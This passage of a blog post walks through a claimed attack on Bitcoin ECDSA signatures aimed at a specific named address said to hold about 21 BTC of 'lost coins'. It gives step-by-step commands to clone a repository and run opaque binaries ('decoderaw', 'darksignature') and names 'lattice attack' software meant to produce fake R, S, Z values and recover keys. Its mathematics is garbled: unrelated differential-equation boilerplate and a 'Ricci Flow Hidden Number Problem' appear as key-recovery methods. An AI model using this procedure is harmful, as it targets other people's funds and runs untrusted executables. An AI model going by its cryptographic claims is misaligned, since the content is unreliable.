<p><a href="https://github.com/demining/Signature-Malleability/tree/main#decodingrawtxwithdecoderaw-tool"></a></p>
<!-- /wp:paragraph -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><em>First, let’s get&nbsp;<strong><a href="https://github.com/demining/CryptoDeepTools/blob/main/36SignatureMalleability/RawTX.txt">RawTX,</a></strong></em>&nbsp;<em>the encoded Bitcoin transaction in hexadecimal format.&nbsp;</em><strong><sup><a href="https://cryptodeeptool.ru/signature-malleability/#aa553e57-81fe-4c3c-98dd-0d1b60ea55ee">1</a></sup></strong></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>Let’s open a new notebook in&nbsp;<strong><a href="https://colab.research.google.com/">Google Colab</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><strong>Command:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>!git clone https://github.com/smartibase/Broadcast-Bitcoin-Transaction.git

cd Broadcast-Bitcoin-Transaction/

!python setup.py
</strong></code></pre>
<!-- /wp:code -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Signature-Malleability/blob/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-26-1024x465.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Signature-Malleability/raw/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-26-1024x465.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><strong>Command:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>cd decoderaw/

!chmod +x decoderaw

ls

!./decoderaw</strong></code></pre>
<!-- /wp:code -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Signature-Malleability/blob/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-28-1024x538.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Signature-Malleability/raw/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-28-1024x538.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><strong>Command:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>!./decoderaw 01000000010dbc696374c8d7ca61f32710e03aaedcb7a4f2428074814d0e1f4f7f5c1e5935000000008b48304502210097255916a3cc4f69d4fa16f68219d0b1798d392fb0dce5fb0a358510df8cabe002201014656120e0a6e7c8c4a79ee22b3cdd4f55435e3e9bf3ab7287ae16858dd9d50141049b4069d8237fae8f2417c71c5512ec1b0547b5597474480cc28ea1bbfeecaab8b90fdec161ad6ef4378f274a60b900452431533596bf3bd23e01202ebf679461ffffffff01d2040000000000001976a914d77522a2b18e0064aba02ca7f864a5bb2299825988ac00000000</strong></code></pre>
<!-- /wp:code -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Signature-Malleability/blob/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-29-1024x330.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Signature-Malleability/raw/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-29-1024x330.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>Result:

1111,0097255916a3cc4f69d4fa16f68219d0b1798d392fb0dce5fb0a358510df8cabe0,1014656120e0a6e7c8c4a79ee22b3cdd4f55435e3e9bf3ab7287ae16858dd9d5,931a52e8610cf87b6d00875f687042224c305865fd20ecb15ef76b1277ba10fd,0000
</strong></code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">Practical part</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Signature-Malleability/tree/main#practical-part"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>From the theory of vulnerability&nbsp;<strong><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-42461">CVE-2024-42461</a></strong>&nbsp;&nbsp;it is known that attackers can use incorrect values ​​to create fake transaction signatures. Let’s move on to the practical part of the article and consider an example using a Bitcoin wallet:&nbsp;&nbsp;<a href="https://btc1.trezor.io/address/1LeEbwu667oPtQC5dKiGiysUjFM3mQaxpw"><strong>1LeEbwu667oPtQC5dKiGiysUjFM3mQaxpw</strong></a>&nbsp;&nbsp;, where there were lost coins in the amount of:&nbsp;&nbsp;<strong>21.2529214 BTC</strong>&nbsp;&nbsp;as of November 2024, this amount is:&nbsp;&nbsp;<strong>1744572.51 USD</strong></p>
<!-- /wp:paragraph -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Signature-Malleability/blob/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-46-1024x366.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Signature-Malleability/raw/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-46-1024x366.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">Solution of differential equation</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Signature-Malleability/tree/main#solution-of-differential-equation"></a></p>
<!-- /wp:paragraph -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><em>Solutions of differential equations help to model various processes, this formula allows us to understand and predict the behavior of various systems depending on the change in variables.&nbsp;</em></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Signature-Malleability/blob/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-21.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Signature-Malleability/raw/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-21.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures"/></a></figure>
<!-- /wp:image -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><em><a href="https://keyhunters.ru/differential-equations/">General solution of a differential equation</a>&nbsp;where the function&nbsp;&nbsp;<strong>y</strong>&nbsp;&nbsp;depends on the variable&nbsp;&nbsp;<strong>x</strong>&nbsp;.</em></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:list {"ordered":true} -->
<ol class="wp-block-list"><!-- wp:list-item -->
<li><strong>Original equation</strong> :<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>The left side of the equation can be interpreted as the derivative of the function  <em><strong>y</strong></em>  with respect to  <em><strong>x</strong></em> , which is equal to the product of two functions:  <strong><em>g</em> ( <em>y</em> )</strong> , depending on  <em><strong>y</strong></em> , and  <strong><em>h</em> ( <em>x</em> )</strong> , depending on  <em><strong>x</strong></em> .</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Rewriting the equation</strong> :<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>The equation can be rewritten in a form that separates the variables:</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p><a target="_blank" rel="noreferrer noopener" href="https://github.com/demining/Signature-Malleability/blob/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-22.png"></a>This allows both sides to be integrated separately.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>After separating the variables, we can integrate both sides exactly:</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><em>Left side relative to&nbsp;&nbsp;<strong>y</strong></em>&nbsp;:</p>
<!-- /wp:paragraph -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Signature-Malleability/blob/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-23.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Signature-Malleability/raw/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-23.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures"/></a></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><em>Right side relative to&nbsp;&nbsp;<strong>x</strong></em>&nbsp;:</p>
<!-- /wp:paragraph -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Signature-Malleability/blob/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-25.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Signature-Malleability/raw/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-25.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures"/></a></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>We will explore the relationship between variables through integration&nbsp;<code><strong>[ frac{dy}{dx} = g(y)h(x) quad Rightarrow quad frac{1}{g(y)} dy = h(x) dx ]</strong></code>and apply a tool for mathematical analysis and solving differential equations.</p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":1} -->
<h1 class="wp-block-heading"><a href="https://perelmanwork.com/ricci-flow-hnp">Perelman Work</a></h1>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Signature-Malleability/tree/main#perelman-work"></a></p>
<!-- /wp:paragraph -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://www.youtube.com/watch?v=isWxfa3PeHU"><img src="https://github.com/demining/Signature-Malleability/raw/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-1(1).png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><em><a href="https://github.com/smartibase/Broadcast-Bitcoin-Transaction/tree/main/darksignature"><strong>Example #1</strong></a>&nbsp;using the<a href="https://github.com/smartibase/Broadcast-Bitcoin-Transaction/tree/main/darksignature"><strong>&nbsp;DarkSignature</strong></a></em>&nbsp;tool:</p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:paragraph -->
<p>Let’s go back to the root directory of the&nbsp;<a href="https://github.com/smartibase/Broadcast-Bitcoin-Transaction"><strong>Broadcast Bitcoin Transaction repository</strong></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>Command:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>cd -

ls
</strong></code></pre>
<!-- /wp:code -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Signature-Malleability/blob/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-30-1024x294.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Signature-Malleability/raw/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-30-1024x294.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><strong>Command:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>cd darksignature/

!chmod +x darksignature

ls

!./darksignature
</strong></code></pre>
<!-- /wp:code -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Signature-Malleability/blob/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-31-1024x601.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Signature-Malleability/raw/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-31-1024x601.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>To obtain&nbsp;<a href="https://github.com/demining/CryptoDeepTools/blob/main/36SignatureMalleability/pubkey.txt">the public key</a>&nbsp;to the Bitcoin Address&nbsp;<strong>1LeEbwu667oPtQC5dKiGiysUjFM3mQaxpw,</strong>&nbsp;select the command:</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>darksignature -address &lt;Bitcoin Address&gt;</strong></code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>Enter the Bitcoin address and get&nbsp;<a href="https://github.com/demining/CryptoDeepTools/blob/main/36SignatureMalleability/pubkey.txt">the public key</a>&nbsp;:</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>!./darksignature -address 1LeEbwu667oPtQC5dKiGiysUjFM3mQaxpw</strong></code></pre>
<!-- /wp:code -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Signature-Malleability/blob/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-32-1024x74.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Signature-Malleability/raw/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-32-1024x74.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><strong>Result:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>pubkey: (HEX) = 049b4069d8237fae8f2417c71c5512ec1b0547b5597474480cc28ea1bbfeecaab8b90fdec161ad6ef4378f274a60b900452431533596bf3bd23e01202ebf679461</strong></code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><em><strong><a href="https://dockeyhunt.com/dockeyhunt-lattice-attack/">Example #2</a></strong>&nbsp;using<strong><a href="https://dockeyhunt.com/dockeyhunt-lattice-attack/">&nbsp;Dockeyhunt Lattice Attack</a></strong></em>&nbsp;tool:</p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:paragraph -->
<p><a href="https://dockeyhunt.com/dockeyhunt-lattice-attack/"><strong>We launch the Dockeyhunt Lattice Attack</strong></a>&nbsp;software and&nbsp;<code>"Input date"</code>enter the Bitcoin Address&nbsp;<a href="https://btc1.trezor.io/address/1LeEbwu667oPtQC5dKiGiysUjFM3mQaxpw"><strong>1LeEbwu667oPtQC5dKiGiysUjFM3mQaxpw</strong></a>&nbsp;in the field&nbsp;and receive the public key of the wallet:</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>049b4069d8237fae8f2417c71c5512ec1b0547b5597474480cc28ea1bbfeecaab8b90fdec161ad6ef4378f274a60b900452431533596bf3bd23e01202ebf679461
</strong></code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p><a href="https://youtu.be/isWxfa3PeHU?t=53"></a><em><a href="https://youtu.be/isWxfa3PeHU?t=53">Time-stamped video</a></em></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>Let’s use the DarkSignature</strong>&nbsp;tool&nbsp;to get fake data&nbsp;<strong>R, S, Z</strong>&nbsp;values ​​for the ECDSA algorithm transaction. In the field,&nbsp;<code>"Input date"</code>enter the public key of the Bitcoin Address&nbsp;<strong><code>049b4069d8237fae8f2417c71c5512ec1b0547b5597474480cc28ea1bbfeecaab8b90fdec161ad6ef4378f274a60b900452431533596bf3bd23e01202ebf679461</code></strong>and get the data&nbsp;<strong>R, S, Z</strong>&nbsp;values ​​in the amount of&nbsp;<em>32 Bitcoin transactions</em>&nbsp;.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><a href="https://youtu.be/isWxfa3PeHU?t=67"></a><em><a href="https://youtu.be/isWxfa3PeHU?t=67">Time-stamped video</a></em></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>Apply getting fake data value&nbsp;<strong>R, S, Z</strong>&nbsp;for ECDSA algorithm transaction in&nbsp;<a href="https://keyhunters.ru/google-colab-in-cryptanalysis/">Google Colab</a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>Let’s install the ECDSA module:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>pip install ecdsa</strong></code></pre>
<!-- /wp:code -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Signature-Malleability/blob/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-33-1024x200.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Signature-Malleability/raw/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-33-1024x200.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>To obtain coordinates&nbsp;<code><strong>(Gx, Gy)</strong></code>for the public key, we will use a&nbsp;<em>Python</em>&nbsp;script:&nbsp;<strong><a href="https://github.com/smartibase/Broadcast-Bitcoin-Transaction/blob/main/darksignature/coordinates.py">darksignature/coordinates.py</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Signature-Malleability/blob/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-34-1024x508.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Signature-Malleability/raw/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-34-1024x508.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><strong>Let’s use the command:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><code><strong>darksignature -pubkey &lt;Gx Gy&gt;</strong></code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><em>We run the Python</em>&nbsp;script code&nbsp;:&nbsp;<strong><a href="https://github.com/smartibase/Broadcast-Bitcoin-Transaction/blob/main/darksignature/transactions.py">darksignature/transactions.py</a></strong>&nbsp;and get the data values&nbsp;<strong>​​R, S, Z</strong>&nbsp;in the amount will be&nbsp;<em>32 Bitcoin transactions</em>&nbsp;.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Signature-Malleability/blob/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/darkmedia.gif" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Signature-Malleability/raw/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/darkmedia.gif" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures"/></a></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>After generation we get the file:&nbsp;<strong><a href="https://github.com/demining/CryptoDeepTools/blob/main/36SignatureMalleability/SignatureRSZ.txt">SignatureRSZ.txt</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>Also in the root directory:&nbsp;<code><strong>c:\PerelmanWork\Dockeyhunt Lattice Attack\</strong></code>we get the file:&nbsp;<strong><a href="https://github.com/demining/CryptoDeepTools/blob/main/36SignatureMalleability/Signatures.txt">Signatures.txt</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Signature-Malleability/blob/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-2-1024x546.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Signature-Malleability/raw/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-2-1024x546.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><a href="https://youtu.be/isWxfa3PeHU?t=94"></a><em><a href="https://youtu.be/isWxfa3PeHU?t=94">Time-stamped video</a></em></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p>As we can see the first two digits the value of&nbsp;<strong><em>S</em></strong>&nbsp;is arranged as&nbsp;<strong>the Order of the group (N)</strong></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading"><em><a href="https://github.com/demining/CryptoDeepTools/blob/main/36SignatureMalleability/value_n.py">Python script: value_n.py</a></em></h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Signature-Malleability/tree/main#python-script-value_npy-1"></a></p>
<!-- /wp:paragraph -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Signature-Malleability/blob/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-17.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Signature-Malleability/raw/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-17.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><strong><a href="https://perelmanwork.com/">As a tool for mathematical analysis and solving differential equations, we will use the Perelman Work</a></strong>&nbsp;software&nbsp;. We will select the option from the&nbsp;<strong>Functions and Graphs</strong>&nbsp;section for a complete relationship between variables through the integration of&nbsp;<strong>First-order differential equations:</strong>&nbsp;<code><strong>[ frac{dy}{dx} = g(y)h(x) quad Rightarrow quad frac{1}{g(y)} dy = h(x) dx ]</strong></code></p>
<!-- /wp:paragraph -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Signature-Malleability/blob/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-4-1024x548.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Signature-Malleability/raw/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-4-1024x548.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">Ricci Flow Hidden Number Problem</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Signature-Malleability/tree/main#ricci-flow-hidden-number-problem"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>We copy the values ​​from the file:&nbsp;<strong><a href="https://github.com/demining/CryptoDeepTools/blob/main/36SignatureMalleability/Signatures.txt">Signatures.txt</a></strong>&nbsp;according to the list and paste them into the input field&nbsp;<code><strong>Ricci Flow HNP</strong></code>to build completely new transactions of the&nbsp;<strong>ECDSA</strong>&nbsp;algorithm .</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><a href="https://youtu.be/isWxfa3PeHU?t=226"></a><em><a href="https://youtu.be/isWxfa3PeHU?t=226">Time-stamped video</a></em></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Signature-Malleability/blob/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-11-1024x544.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Signature-Malleability/raw/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-11-1024x544.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"linkDestination":"custom"} -->
